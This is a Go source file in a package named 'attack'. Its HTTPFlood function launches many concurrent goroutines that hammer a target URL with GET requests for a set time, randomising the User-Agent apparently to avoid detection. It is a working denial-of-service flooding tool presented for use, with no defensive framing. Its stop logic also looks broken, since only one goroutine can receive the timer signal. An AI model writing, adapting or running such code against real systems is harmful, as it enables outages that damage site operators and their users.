package attack

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

func HTTPFlood(target string, threads, duration int) {
	var wg sync.WaitGroup
	stop := time.After(time.Duration(duration) * time.Second)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := &http.Client{Timeout: 3 * time.Second}
			for {
				select {
				case <-stop:
					return
				default:
					req, _ := http.NewRequest("GET", target, nil)
					req.Header.Set("User-Agent", RandomUA())
					resp, err := client.Do(req)
					if err == nil {
						resp.Body.Close()
					}
				}
			}
		}(i)
	}
	wg.Wait()
	fmt.Println("HTTP flood complete.")
}
